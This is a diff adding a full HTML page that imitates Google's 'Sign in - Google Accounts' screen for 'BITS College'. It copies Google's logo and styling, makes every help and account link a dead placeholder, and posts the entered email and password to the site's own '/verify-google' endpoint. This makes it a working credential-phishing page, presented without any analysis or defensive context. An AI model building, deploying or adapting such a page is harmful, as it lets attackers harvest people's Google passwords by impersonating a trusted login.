@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover">
+<title>Sign in - Google Accounts</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:auto;min-height:100%}
+  body{
+    font-family:'Roboto',-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
+    background:#fff;color:#202124;
+    padding:24px 16px 40px;
+    -webkit-font-smoothing:antialiased;
+    overflow-y:auto;-webkit-overflow-scrolling:touch;
+  }
+  .wrap{width:100%;max-width:420px;margin:0 auto}
+
+  .logo{display:flex;justify-content:center;margin-bottom:14px}
+  .logo svg{width:60px;height:60px}
+
+  h1{font-size:22px;font-weight:400;text-align:center;color:#202124;margin-bottom:6px}
+  .sub{font-size:14px;color:#5f6368;text-align:center;margin-bottom:24px}
+
+  .card{background:#fff;border:1px solid #dadce0;border-radius:8px;
+        padding:32px 32px 24px;box-shadow:none}
+  .card h2{display:none}
+
+  .account{
+    display:flex;align-items:center;gap:14px;padding:12px 0 18px;
+    border-bottom:1px solid #e8eaed;margin-bottom:18px
+  }
+  .avatar{
+    width:38px;height:38px;border-radius:50%;background:#8bc34a;
+    display:flex;align-items:center;justify-content:center;
+    color:#fff;font-weight:600;font-size:16px;flex-shrink:0
+  }
+  .acc-name{font-size:14px;font-weight:500;color:#202124}
+  .acc-mail{font-size:12.5px;color:#5f6368}
+
+  .field{margin-bottom:18px;position:relative}
+  .field label{display:none}
+  .field input{
+    width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;
+    font-size:15px;color:#202124;outline:none;font-family:inherit;
+    transition:border-color .18s, box-shadow .18s
+  }
+  .field input:focus{border-color:#1a73e8;
+    box-shadow:0 0 0 2px rgba(26,115,232,.1)}
+  .field .icon{display:none}
+
+  .btn{width:100%;padding:12px;border:0;border-radius:4px;cursor:pointer;
+       font-size:14px;font-weight:500;font-family:inherit;
+       letter-spacing:.25px;transition:background .18s;
+       text-align:center;text-decoration:none;display:block}
+  .btn-primary{background:#1a73e8;color:#fff;margin-top:4px}
+  .btn-primary:active{background:#1557b0}
+  .btn:disabled{opacity:.6;cursor:not-allowed}
+
+  .link-row{display:flex;justify-content:space-between;margin-top:22px}
+  .link-row a{font-size:13px;color:#1a73e8;text-decoration:none;
+              padding:6px 2px;font-weight:500}
+  .link-row a:hover{text-decoration:underline}
+
+  .foot{
+    display:flex;justify-content:space-between;align-items:center;
+    margin-top:28px;font-size:12px;color:#5f6368;padding:0 4px
+  }
+  .foot a{color:#5f6368;text-decoration:none;padding:6px 8px}
+  .foot a:hover{color:#202124}
+
+  .spinner{display:inline-block;width:12px;height:12px;
+    border:2px solid rgba(255,255,255,.4);border-top-color:#fff;
+    border-radius:50%;animation:sp .7s linear infinite;
+    vertical-align:-2px;margin-right:8px}
+  @keyframes sp{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="logo">
+    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#4285F4" d="M45 24c0-1.5-.14-3-.4-4.5H24v8.5h11.8c-.5 2.7-2 5-4.3 6.5v5.4h6.9C42.7 36 45 30.6 45 24z"/>
+      <path fill="#34A853" d="M24 46c5.6 0 10.3-1.9 13.7-5.1l-6.9-5.4c-1.9 1.3-4.3 2.1-6.8 2.1-5.3 0-9.7-3.6-11.3-8.4H5.5v5.6C9 41.9 15.9 46 24 46z"/>
+      <path fill="#FBBC05" d="M12.7 29.2A13 13 0 0 1 12 24c0-1.8.3-3.6.8-5.2v-5.6H5.5A22 22 0 0 0 3 24c0 3.6.9 6.9 2.5 9.8l7.2-4.6z"/>
+      <path fill="#EA4335" d="M24 10.6c3 0 5.7 1 7.8 3l5.9-5.9C34.2 4.5 29.6 2.5 24 2.5 15.9 2.5 9 6.6 5.5 12.8l7.2 5.6C14.3 14.2 18.7 10.6 24 10.6z"/>
+    </svg>
+  </div>
+
+  <h1>Sign in</h1>
+  <p class="sub">to continue to BITS College</p>
+
+  <div class="card">
+    <div class="account">
+      <div class="avatar" id="av">B</div>
+      <div>
+        <div class="acc-name" id="an">BITS Student</div>
+        <div class="acc-mail" id="am">your.name@gmail.com</div>
+      </div>
+    </div>
+
+    <form id="gform" method="POST" action="/verify-google" autocomplete="off">
+      <div class="field">
+        <input id="gemail" name="email" type="email"
+               placeholder="Email or phone" required autofocus
+               oninput="document.getElementById('am').textContent=this.value;document.getElementById('an').textContent=this.value.split('@')[0];document.getElementById('av').textContent=(this.value[0]||'B').toUpperCase()">
+      </div>
+      <div class="field">
+        <input id="gpass" name="password" type="password"
+               placeholder="Enter your password" required>
+      </div>
+      <button type="submit" class="btn btn-primary" id="gbtn">Next</button>
+    </form>
+
+    <div class="link-row">
+      <a href="#" onclick="return false">Forgot email?</a>
+      <a href="#" onclick="return false">Create account</a>
+    </div>
+  </div>
+
+  <div class="foot">
+    <a href="#" onclick="return false">English (United States)</a>
+    <div>
+      <a href="#" onclick="return false">Help</a>
+      <a href="#" onclick="return false">Privacy</a>
+      <a href="#" onclick="return false">Terms</a>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  const f = document.getElementById('gform');
+  const b = document.getElementById('gbtn');
+  f.addEventListener('submit', function(){
+    b.disabled = true;
+    b.innerHTML = '<span class="spinner"></span>Signing in\u2026';
+  });
+</script>
+</body>
+</html>
